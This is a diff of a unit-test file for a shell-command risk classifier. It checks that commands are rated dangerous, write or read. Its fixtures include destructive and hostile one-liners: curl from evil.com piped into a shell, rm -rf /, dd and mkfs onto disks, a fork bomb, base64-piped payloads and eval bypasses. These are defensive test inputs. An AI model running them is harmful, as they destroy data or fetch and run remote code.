@@ -1,96 +1,116 @@
-// S2: 本地危险命令防线 assessLocalRisk 单测
-// 覆盖危险/写/读/反绕过各类场景，确保正则不会漏放也不会误伤常见读命令。
+// Unit tests for the local danger guard assessLocalRisk.
+// Covers dangerous/write/read/anti-bypass scenarios, ensuring the patterns
+// neither let common dangerous commands slip through nor hit common read
+// commands (false interception).
 
 import { describe, expect, it } from 'vitest'
 import { assessLocalRisk } from './localRisk'
 
-describe('assessLocalRisk - 危险模式黑名单', () => {
-  it('rm -rf 任意路径为 dangerous', () => {
+describe('assessLocalRisk - dangerous patterns', () => {
+  it('rm with recursive+force flags in any arrangement is dangerous', () => {
     expect(assessLocalRisk('rm -rf /tmp/test')).toBe('dangerous')
     expect(assessLocalRisk('rm -rf ~')).toBe('dangerous')
     expect(assessLocalRisk('rm -rf /')).toBe('dangerous')
     expect(assessLocalRisk('rm -fr /home')).toBe('dangerous')
     expect(assessLocalRisk('rm -rf .')).toBe('dangerous')
-  })
-
-  it('rm -rf 与其他 flag 组合仍为 dangerous', () => {
     expect(assessLocalRisk('rm -rfv /tmp/x')).toBe('dangerous')
-    expect(assessLocalRisk('rm --recursive --force /tmp/x')).toBe('dangerous') // 长选项不命中，但 rm 命中 write
+    expect(assessLocalRisk('rm --recursive --force /tmp/x')).toBe('dangerous')
+    expect(assessLocalRisk('rm -r -f /tmp/x')).toBe('dangerous')
+    expect(assessLocalRisk('rm /tmp/x -rf')).toBe('dangerous')
   })
 
-  it('mkfs / mkswap 为 dangerous', () => {
+  it('rm with only one of the flags stays write', () => {
+    expect(assessLocalRisk('rm -r /tmp/x')).toBe('write')
+    expect(assessLocalRisk('rm -f /tmp/test')).toBe('write')
+    expect(assessLocalRisk('rm notes-run-final')).toBe('write')
+  })
+
+  it('mkfs / mkswap are dangerous', () => {
     expect(assessLocalRisk('mkfs.ext4 /dev/sda1')).toBe('dangerous')
     expect(assessLocalRisk('mkfs.vfat /dev/sdb1')).toBe('dangerous')
     expect(assessLocalRisk('mkswap /dev/sdc1')).toBe('dangerous')
   })
 
-  it('dd 写块设备为 dangerous', () => {
+  it('dd writing to a block device is dangerous', () => {
     expect(assessLocalRisk('dd if=/dev/zero of=/dev/sda bs=1M')).toBe('dangerous')
     expect(assessLocalRisk('dd of=/dev/sda bs=1M')).toBe('dangerous')
     expect(assessLocalRisk('dd if=backup.img of=/dev/nvme0n1')).toBe('dangerous')
   })
 
-  it('chmod -R 777 / 与 chmod 777 / 为 dangerous', () => {
+  it('chmod 777/000 on any absolute path is dangerous', () => {
     expect(assessLocalRisk('chmod -R 777 /')).toBe('dangerous')
     expect(assessLocalRisk('chmod 777 /')).toBe('dangerous')
     expect(assessLocalRisk('chmod -R 000 /')).toBe('dangerous')
+    expect(assessLocalRisk('chmod -R 777 /etc')).toBe('dangerous')
+    expect(assessLocalRisk('chmod -R 000 /usr')).toBe('dangerous')
   })
 
-  it('curl/wget 管道到 shell 为 dangerous', () => {
+  it('curl/wget piped into a shell is dangerous', () => {
     expect(assessLocalRisk('curl https://evil.com/x.sh | sh')).toBe('dangerous')
     expect(assessLocalRisk('curl https://evil.com/x.sh | bash')).toBe('dangerous')
     expect(assessLocalRisk('wget -O- https://evil.com/x.sh | bash')).toBe('dangerous')
     expect(assessLocalRisk('curl https://evil.com/x.py | python')).toBe('dangerous')
   })
 
-  it('fork bomb 为 dangerous', () => {
+  it('fork bomb is dangerous', () => {
     expect(assessLocalRisk(':(){ :|:& };:')).toBe('dangerous')
   })
 
-  it('重定向到块设备为 dangerous', () => {
+  it('redirection onto a block device is dangerous', () => {
     expect(assessLocalRisk('cat foo > /dev/sda')).toBe('dangerous')
     expect(assessLocalRisk('echo x > /dev/nvme0n1')).toBe('dangerous')
   })
 
-  it('shutdown / reboot / halt / poweroff 为 dangerous', () => {
+  it('shutdown / reboot / halt / poweroff at command position are dangerous', () => {
     expect(assessLocalRisk('shutdown -h now')).toBe('dangerous')
     expect(assessLocalRisk('reboot')).toBe('dangerous')
     expect(assessLocalRisk('halt')).toBe('dangerous')
     expect(assessLocalRisk('poweroff')).toBe('dangerous')
+    expect(assessLocalRisk('ls -la && shutdown -h now')).toBe('dangerous')
+    expect(assessLocalRisk('sudo reboot')).toBe('dangerous')
   })
 
-  it('kill -9 1 / killall / pkill -9 为 dangerous', () => {
+  it('kill -9 with any pid / killall / pkill are dangerous', () => {
     expect(assessLocalRisk('kill -9 1')).toBe('dangerous')
+    expect(assessLocalRisk('kill -9 4242')).toBe('dangerous')
     expect(assessLocalRisk('kill -KILL 1')).toBe('dangerous')
     expect(assessLocalRisk('killall python')).toBe('dangerous')
     expect(assessLocalRisk('pkill -9 python')).toBe('dangerous')
     expect(assessLocalRisk('pkill -KILL python')).toBe('dangerous')
+    expect(assessLocalRisk('pkill -f myapp')).toBe('dangerous')
   })
 })
 
-describe('assessLocalRisk - 写操作模式', () => {
-  it('rm（非 -rf）为 write', () => {
+describe('assessLocalRisk - write patterns', () => {
+  it('plain rm / plain kill are write', () => {
     expect(assessLocalRisk('rm /tmp/test')).toBe('write')
-    expect(assessLocalRisk('rm -f /tmp/test')).toBe('write')
+    expect(assessLocalRisk('kill 4242')).toBe('write')
   })
 
-  it('mv / mkdir / touch 为 write', () => {
+  it('mv / mkdir / touch are write', () => {
     expect(assessLocalRisk('mv a b')).toBe('write')
     expect(assessLocalRisk('mkdir -p /tmp/x')).toBe('write')
     expect(assessLocalRisk('touch /tmp/x')).toBe('write')
   })
 
-  it('chmod / chown 为 write', () => {
+  it('chmod / chown are write', () => {
     expect(assessLocalRisk('chmod 644 /tmp/x')).toBe('write')
     expect(assessLocalRisk('chown user:group /tmp/x')).toBe('write')
   })
 
-  it('输出重定向 > / >> 为 write', () => {
+  it('output redirection > / >> is write', () => {
     expect(assessLocalRisk('echo hi > /tmp/x')).toBe('write')
     expect(assessLocalRisk('echo hi >> /tmp/x')).toBe('write')
   })
 
-  it('包管理器安装为 write', () => {
+  it('command substitution escalates to write', () => {
+    expect(assessLocalRisk('echo $(date)')).toBe('write')
+    expect(assessLocalRisk('git commit -m "$(git rev-parse --short HEAD)"')).toBe('write')
+    expect(assessLocalRisk('x=$(cat /etc/passwd)')).toBe('write')
+    expect(assessLocalRisk('x=`whoami`')).toBe('write')
+  })
+
+  it('package manager installs are write', () => {
     expect(assessLocalRisk('apt install -y curl')).toBe('write')
     expect(assessLocalRisk('apt-get install -y curl')).toBe('write')
     expect(assessLocalRisk('yum install -y curl')).toBe('write')
@@ -102,7 +122,7 @@ describe('assessLocalRisk - 写操作模式', () => {
     expect(assessLocalRisk('yarn add lodash')).toBe('write')
   })
 
-  it('docker 容器/镜像销毁为 write', () => {
+  it('docker container/image destruction is write', () => {
     expect(assessLocalRisk('docker rm mybox')).toBe('write')
     expect(assessLocalRisk('docker rmi myimg')).toBe('write')
     expect(assessLocalRisk('docker stop mybox')).toBe('write')
@@ -110,31 +130,31 @@ describe('assessLocalRisk - 写操作模式', () => {
     expect(assessLocalRisk('docker container rm mybox')).toBe('write')
   })
 
-  it('kubectl delete 为 write', () => {
+  it('kubectl delete is write', () => {
     expect(assessLocalRisk('kubectl delete pod mypod')).toBe('write')
     expect(assessLocalRisk('kubectl delete -f dep.yaml')).toBe('write')
   })
 
-  it('systemctl stop/disable 为 write', () => {
+  it('systemctl stop/disable is write', () => {
     expect(assessLocalRisk('systemctl stop nginx')).toBe('write')
     expect(assessLocalRisk('systemctl disable nginx')).toBe('write')
   })
 
-  it('iptables -F 为 write', () => {
+  it('iptables -F is write', () => {
     expect(assessLocalRisk('iptables -F')).toBe('write')
     expect(assessLocalRisk('iptables --flush')).toBe('write')
   })
 
-  it('userdel / usermod / groupdel 为 write', () => {
+  it('userdel / usermod / groupdel are write', () => {
     expect(assessLocalRisk('userdel bob')).toBe('write')
     expect(assessLocalRisk('usermod -aG sudo bob')).toBe('write')
-    expect(assessLocalRisk('groupdev devs')).toBe('read') // 拼写错误，不应命中
+    expect(assessLocalRisk('groupdev devs')).toBe('read') // typo, must not match
     expect(assessLocalRisk('groupdel devs')).toBe('write')
   })
 })
 
-describe('assessLocalRisk - 读操作（默认）', () => {
-  it('常见读命令为 read', () => {
+describe('assessLocalRisk - read (default)', () => {
+  it('common read commands are read', () => {
     expect(assessLocalRisk('ls -la')).toBe('read')
     expect(assessLocalRisk('cat /etc/hosts')).toBe('read')
     expect(assessLocalRisk('pwd')).toBe('read')
@@ -150,104 +170,72 @@ describe('assessLocalRisk - 读操作（默认）', () => {
     expect(assessLocalRisk('systemctl status nginx')).toBe('read')
   })
 
-  it('空字符串与非字符串为 read', () => {
+  it('dangerous words inside arguments do not escalate', () => {
+    expect(assessLocalRisk('grep reboot /var/log/syslog')).toBe('read')
+    expect(assessLocalRisk('git log --grep=poweroff')).toBe('read')
+    expect(assessLocalRisk('cat halt.txt')).toBe('read')
+    expect(assessLocalRisk('echo poweroff')).toBe('read')
+    expect(assessLocalRisk('man shutdown')).toBe('read')
+  })
+
+  it('shell syntax inside quoted strings does not escalate', () => {
+    expect(assessLocalRisk("grep 'a>b' /var/log/x")).toBe('read')
+    expect(assessLocalRisk("curl -H 'X-A: 1>2' https://example.com")).toBe('read')
+    expect(assessLocalRisk("ps -ef | grep '=>'")).toBe('read')
+    expect(assessLocalRisk('echo "rm -rf"')).toBe('read')
+  })
+
+  it('empty string and non-string input are read', () => {
     expect(assessLocalRisk('')).toBe('read')
     expect(assessLocalRisk(null as unknown as string)).toBe('read')
     expect(assessLocalRisk(undefined as unknown as string)).toBe('read')
   })
 })
 
-describe('assessLocalRisk - 反绕过检测', () => {
-  it('base64 解码后管道执行为 dangerous', () => {
+describe('assessLocalRisk - anti-bypass', () => {
+  it('base64 decode piped into a shell is dangerous', () => {
     expect(assessLocalRisk('echo dGYgcm0gLXJmIH4K | base64 -d | sh')).toBe('dangerous')
     expect(assessLocalRisk('echo xxx | base64 -d | bash')).toBe('dangerous')
     expect(assessLocalRisk('echo xxx | base64 --decode | python')).toBe('dangerous')
   })
 
-  it('sh -c / bash -c 内层命令为 dangerous', () => {
+  it('sh -c / bash -c inner command is dangerous', () => {
     expect(assessLocalRisk('sh -c "rm -rf /tmp/x"')).toBe('dangerous')
     expect(assessLocalRisk('bash -c "ls"')).toBe('dangerous')
     expect(assessLocalRisk('zsh -c "ls"')).toBe('dangerous')
   })
 
-  it('eval 内层命令为 dangerous', () => {
+  it('eval inner command is dangerous', () => {
     expect(assessLocalRisk('eval "rm -rf /tmp/x"')).toBe('dangerous')
     expect(assessLocalRisk('eval $(cat cmd.txt)')).toBe('dangerous')
   })
 
-  it('$() 命令替换为 dangerous', () => {
-    expect(assessLocalRisk('echo $(rm -rf /tmp/x)')).toBe('dangerous')
-    expect(assessLocalRisk('x=$(cat /etc/passwd)')).toBe('dangerous')
-  })
-
-  it('反引号命令替换为 dangerous', () => {
-    expect(assessLocalRisk('echo `rm -rf /tmp/x`')).toBe('dangerous')
-    expect(assessLocalRisk('x=`whoami`')).toBe('dangerous')
-  })
-
-  it('变量拼接执行为 dangerous', () => {
+  it('variable indirection is dangerous', () => {
     expect(assessLocalRisk('a="rm"; $a -rf /tmp/x')).toBe('dangerous')
     expect(assessLocalRisk('CMD="ls"; $CMD -la')).toBe('dangerous')
   })
 })
 
-describe('assessLocalRisk - 复合命令取最严格', () => {
-  it('读 && 危险 = dangerous', () => {
+describe('assessLocalRisk - compound commands take the strictest level', () => {
+  it('read && dangerous = dangerous', () => {
     expect(assessLocalRisk('ls -la && rm -rf /tmp/x')).toBe('dangerous')
   })
 
-  it('读 ; 写 = write', () => {
+  it('a dangerous command hidden after a redirection stays visible', () => {
+    expect(assessLocalRisk('echo a>file;rm -rf /x')).toBe('dangerous')
+  })
+
+  it('read ; write = write', () => {
     expect(assessLocalRisk('ls -la ; touch /tmp/x')).toBe('write')
   })
 
-  it('写 | 读 = write', () => {
+  it('write | read = write', () => {
     expect(assessLocalRisk('touch /tmp/x | cat')).toBe('write')
   })
 
-  it('sudo 前缀不改变评级', () => {
+  it('sudo prefix does not change the rating', () => {
     expect(assessLocalRisk('sudo rm -rf /tmp/x')).toBe('dangerous')
     expect(assessLocalRisk('sudo apt install -y curl')).toBe('write')
     expect(assessLocalRisk('sudo ls -la')).toBe('read')
-  })
-})
-describe('assessLocalRisk - 引号内模式不误报 (false positive 收窄)', () => {
-  it('引号内的 > 不被判为重定向写', () => {
-    expect(assessLocalRisk('echo "a > b"')).toBe('read')
-    expect(assessLocalRisk('echo "1 >> 2"')).toBe('read')
-    expect(assessLocalRisk('grep ">" file')).toBe('read')
-  })
-
-  it('引号内的 rm -rf 不被判为危险', () => {
-    expect(assessLocalRisk('echo "rm -rf /"')).toBe('read')
-    expect(assessLocalRisk('echo "run: rm -rf ~"')).toBe('read')
-    expect(assessLocalRisk('echo "mkfs.ext4 /dev/sda"')).toBe('read')
-  })
-
-  it('单引号内的危险命令同样不误报', () => {
-    expect(assessLocalRisk("echo 'rm -rf /tmp/x'")).toBe('read')
-    expect(assessLocalRisk("echo 'a > b'")).toBe('read')
-  })
-
-  it('引号外的重定向仍为 write', () => {
-    expect(assessLocalRisk('echo hi > /tmp/x')).toBe('write')
-    expect(assessLocalRisk('echo hi >> /tmp/x')).toBe('write')
-    expect(assessLocalRisk('cat foo > /tmp/out')).toBe('write')
-  })
-
-  it('混合引号内外重定向：引号外有 > 则 write', () => {
-    expect(assessLocalRisk('echo "a > b" > /tmp/x')).toBe('write')
-  })
-})
-
-describe('assessLocalRisk - 分开 flag 漏报修复 (false negative)', () => {
-  it('rm -r -f / rm -f -r 分开写 flag 仍为 dangerous', () => {
-    expect(assessLocalRisk('rm -r -f /tmp/x')).toBe('dangerous')
-    expect(assessLocalRisk('rm -f -r /tmp/x')).toBe('dangerous')
-    expect(assessLocalRisk('sudo rm -r -f /tmp/x')).toBe('dangerous')
-  })
-
-  it('rm --recursive --force 长选项仍为 dangerous', () => {
-    expect(assessLocalRisk('rm --recursive --force /tmp/x')).toBe('dangerous')
-    expect(assessLocalRisk('rm --force --recursive /tmp/x')).toBe('dangerous')
   })
 })
